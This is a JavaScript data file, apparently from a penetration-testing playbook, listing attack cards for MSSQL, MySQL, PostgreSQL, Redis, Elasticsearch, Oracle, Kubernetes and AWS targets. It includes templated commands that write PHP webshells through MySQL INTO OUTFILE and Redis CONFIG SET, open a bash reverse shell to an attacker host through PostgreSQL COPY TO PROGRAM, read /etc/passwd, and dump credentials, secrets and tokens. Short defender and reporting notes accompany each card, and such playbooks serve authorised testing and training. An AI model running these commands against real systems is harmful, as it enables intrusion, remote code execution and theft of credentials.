account'],onFailure:{'Login failed':{note:'Credential rejected — wrong auth type (SQL vs Windows) or expired. Try nxc mssql to validate first.'},"you do not have permission":{note:'Not sysadmin. Check for impersonation rights (EXECUTE AS LOGIN) and linked servers — they often grant a path anyway.'}},defender:'xp_cmdshell enabling is a classic alert; sp_configure changes and linked-server use log in SQL audit.',report:{finding:'MSSQL Command Execution via xp_cmdshell',severity:'critical'},tools:['impacket-mssqlclient','nxc','responder'],os:['windows'],refs:['https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html','https://github.com/fortra/impacket']},

{id:'mysql-enum',lane:'database',title:'MySQL Access and File Operations',hypothesis:'MySQL with valid credentials (or the eternal root:root / root:blank guess) can read server files (LOAD_FILE) and write webshells (INTO OUTFILE) when the DB user has FILE privilege — a direct path to code execution on co-located web servers.',prereq:{any:['mysql.reachable','port:3306']},produces:['db.mysql_access','loot.files','foothold.webshell'],commands:[{tool:'mysql',run:"mysql -h {{target}} -u {{user}} -p'{{password}}'",note:'Try the creds you have; also root with blank/common passwords on labs.'},{tool:'mysql',run:"SELECT LOAD_FILE('/etc/passwd');",note:'FILE privilege test. If this returns data, read web configs for more creds.'},{tool:'mysql',run:"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",note:'Webshell write — needs FILE privilege and a writable webroot. Verify path guesses from the web config.'}],expected:['Welcome to the MySQL monitor'],onFailure:{'Access denied':{note:'Creds rejected. Enumerate more, check for default creds, or look for creds in the app source you already have.'}},defender:'General query log and slow log record every statement; OUTFILE writes to webroots are a classic IOC.',report:{finding:'Database Access with FILE Privilege',severity:'high'},tools:['mysql'],os:['linux','windows'],refs:['https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html']},

{id:'postgres-enum',lane:'database',title:'PostgreSQL Access and COPY FROM PROGRAM',hypothesis:'PostgreSQL 9.3+ lets superusers (and pg_execute_server_program members) run OS commands via COPY ... FROM PROGRAM. DB credentials therefore frequently equal a shell as the postgres user — and from there, privesc enumeration starts.',prereq:{any:['postgresql.reachable','port:5432']},produces:['db.postgres_access','foothold.linux'],commands:[{tool:'psql',run:"psql -h {{target}} -U {{user}} -W",note:'Connect with your creds. \\du lists roles; check if you are superuser.'},{tool:'psql',run:"COPY (SELECT '') TO PROGRAM 'id';",note:'Command execution as the postgres OS user. Needs superuser or pg_execute_server_program.'},{tool:'psql',run:"COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"';",note:'Reverse shell variant for labs. Start your listener first.'}],expected:['psql (','uid='],onFailure:{'must be superuser':{note:'No program execution. Fall back to reading tables for creds (\\dt, then dump interesting tables).'}},defender:'COPY TO PROGRAM statements are distinctive in query logs; postgres spawning shells is a strong signal.',report:{finding:'PostgreSQL Command Execution',severity:'high'},tools:['psql'],os:['linux'],refs:['https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html']},

{id:'redis-access',lane:'database',title:'Redis (Unauthenticated)',hypothesis:'Redis on 6379 with no password is a data goldmine AND a write primitive: CONFIG SET dir + SET writes arbitrary files where redis can write — cron files, SSH authorized_keys, webshells (the Postman pattern). Even when writes fail, the data inside (session tokens, creds) is usually worth the visit.',prereq:{any:['port:6379','redis.reachable']},produces:['db.redis_access','credential.candidate','foothold.linux'],commands:[{tool:'redis-cli',run:'redis-cli -h {{target}}',note:'Connect. INFO shows version/config; KEYS * lists keys (small DBs only — use SCAN on big ones).'},{tool:'redis-cli',run:'redis-cli -h {{target}} CONFIG GET dir',note:'Learn the working directory before writing — you need a writable, useful path (webroot, ~/.ssh, cron.d).'},{tool:'sh',run:"redis-cli -h {{target}} CONFIG SET dir /var/www/html && redis-cli -h {{target}} CONFIG SET dbfilename shell.php && echo '<?php system($_GET[\"c\"]); ?>' | redis-cli -h {{target}} -x set payload && redis-cli -h {{target}} save",note:'Webshell write: point dir at the webroot, write payload key, SAVE to flush to disk. Swap target for /root/.ssh/authorized_keys (your pubkey, padded with newlines) when webroot is absent.'}],expected:['PONG','OK'],onFailure:{'NOAUTH':{note:'Password required — check app configs for requirepass; the web app talking to redis has it.'},'Changing the selected db':{note:'Path not writable by redis — enumerate users and try their home dirs.'}},defender:'CONFIG SET and SAVE are logged commands; foreign keys named like shells are obvious.',report:{finding:'Unauthenticated Redis with File Write',severity:'critical'},tools:['redis-cli'],os:['linux'],refs:['https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html']},

{id:'elasticsearch-access',lane:'database',title:'Elasticsearch (Unauthenticated)',hypothesis:'Elasticsearch on 9200 is frequently unauthenticated in labs: every index, every document, queryable over plain HTTP. Log indices leak credentials and internal URLs; old versions have straight RCE CVEs. Search for password/token/secret across all indices first.',prereq:{any:['port:9200','elastic.reachable']},produces:['db.elastic_access','credential.candidate'],commands:[{tool:'curl',run:'curl -s http://{{target}}:9200/_cat/indices?v',note:'List indices and sizes — the layout of the whole datastore.'},{tool:'curl',run:"curl -s 'http://{{target}}:9200/_search?q=password&size=50' | jq",note:'Global keyword search. Also try: secret, token, key, user, pass, flag.'},{tool:'curl',run:"curl -s 'http://{{target}}:9200/<index>/_search?size=100' | jq",note:'Dump a specific index once the keyword search names the interesting ones.'}],expected:['yellow','green','_index'],onFailure:{'401':{note:'X-Pack security enabled — you need creds; check for default elastic:changeme or creds from other services.'}},defender:'Query patterns hitting credential keywords are detectable; unauthenticated 9200 is itself the misconfig.',report:{finding:'Unauthenticated Elasticsearch Data Exposure',severity:'high'},tools:['curl'],os:['linux'],refs:['https://book.hacktricks.wiki/en/network-services-pentesting/9200-pentesting-elasticsearch.html']},

{id:'oracle-odat',lane:'database',title:'Oracle DB Attacks (ODAT)',hypothesis:'Oracle (1521) needs a SID before anything works — odat sidguesser finds them, then default-cred checks and credential logins open the database, and odat modules (utlhttp, ctxsys, java) give command execution and file read/write. sqlplus is the manual fallback for everything.',prereq:{any:['port:1521','oracle.reachable']},produces:['db.oracle_access','foothold.linux'],commands:[{tool:'odat',run:'odat sidguesser -s {{target}}',note:'Find valid SIDs first — every Oracle interaction needs one (XE, ORCL, and the SID in the banner are guesses).'},{tool:'odat',run:'odat passwordguesser -s {{target}} -d <SID>',note:'Default/common credential guessing against a known SID.'},{tool:'odat',run:'odat all -s {{target}} -d <SID> -U {{user}} -P {{password}}',note:'With creds: run the full module battery — it finds which code-execution and file-access paths your user holds.'}],expected:['[+]','SID'],onFailure:{'TNS-12514':{note:'Unknown SID — your guess list missed; widen it (nmap oracle-sid-brute) or extract the SID from tnsnames.ora in app configs.'}},defender:'TNS listener logs every connection; failed-login bursts and java/utlhttp module use alert.',report:{finding:'Oracle Database Compromise',severity:'critical'},tools:['odat'],os:['linux'],refs:['https://github.com/quentinhardy/odat']}
]});

// Cloud & Containers lane
window.OBOL_LANES.push({ lane:'cloud', phase:'Data Services', title:'Cloud & Containers', version:0.1, cards:[

{id:'kubectl-enum',lane:'cloud',title:'Kubernetes API Enumeration',hypothesis:'A Kubernetes API (6443/443) with a found token — from a compromised pod, a config file, or an etcd backup — is enumerated exactly like any target: what can this identity see and do? Service account tokens in pods frequently over-permissioned, and can-i --list tells you instantly what you got.',prereq:{any:['port:6443','k8s.reachable','loot.files']},produces:['k8s.access','loot.files'],commands:[{tool:'kubectl',run:'kubectl --server=https://{{target}}:6443 --token={{token}} --insecure-skip-tls-verify get pods --all-namespaces',note:'First look: what is running, and in which namespaces.'},{tool:'kubectl',run:'kubectl --server=https://{{target}}:6443 --token={{token}} --insecure-skip-tls-verify auth can-i --list',note:'Your actual permissions. Look for: exec into pods, read secrets, create pods (that is node compromise).'},{tool:'kubectl',run:'kubectl --server=https://{{target}}:6443 --token={{token}} --insecure-skip-tls-verify get secrets --all-namespaces',note:'Secrets hold other service-account tokens, registry creds, and app passwords.'},{tool:'kubectl',run:'kubectl --server=https://{{target}}:6443 --token={{token}} --insecure-skip-tls-verify exec -it <pod> -- sh',note:'If can-i allows exec, you are inside another container. Each pod is a new enumeration surface.'}],expected:['NAME','READY','yes'],onFailure:{'Unauthorized':{note:'Token rejected or expired. Hunt for another: /var/run/secrets/kubernetes.io/serviceaccount/token inside pods, .kube/config files, cloud metadata.'}},defender:'K8s audit logs record every API call; exec sessions are particularly loud.',report:{finding:'Kubernetes API Access with Excessive Permissions',severity:'high'},tools:['kubectl'],os:['linux'],refs:['https://kubernetes.io/docs/reference/kubectl/','https://github.com/kubernetes/kubernetes']},

{id:'aws-enum',lane:'cloud',title:'AWS Credential Enumeration',hypothesis:'Found AWS keys (in code, configs, .aws/credentials, or instance metadata at 169.254.169.254) open a whole account to enumerate. LocalStack (awslocal) variants appear in labs as a sandboxed AWS. The doctrine is identical either way: who am I, what can I do, what exists.',prereq:{any:['loot.files','credential.candidate']},produces:['cloud.aws_access','loot.files'],commands:[{tool:'aws',run:'aws sts get-caller-identity',note:'Validate the keys and learn the account/user identity. awslocal for LocalStack targets (port 4566).'},{tool:'aws',run:'aws iam list-users && aws iam list-attached-user-policies --user-name {{user}}',note:'Map users and permissions. What is attached to YOUR identity matters most.'},{tool:'aws',run:'aws s3 ls',note:'Buckets are the classic leak: backups, source code, creds in plain files.'},{tool:'aws',run:'aws ec2 describe-instances',note:'Inventory of compute; user-data scripts frequently contain credentials.'}],expected:['Account','Arn'],onFailure:{'InvalidClientTokenId':{note:'Keys dead or wrong. Check for a second key pair, or whether the target is LocalStack (try awslocal / --endpoint-url http://{{target}}:4566).'}},defender:'CloudTrail logs every API call; enumeration bursts from unknown IPs alert.',report:{finding:'AWS Credentials Exposure',severity:'high'},tools:['aws','awslocal'],os:['linux'],refs:['https://docs.aws.amazon.com/cli/','https://github.com/RhinoSecurityLabs/pacu']}
]});
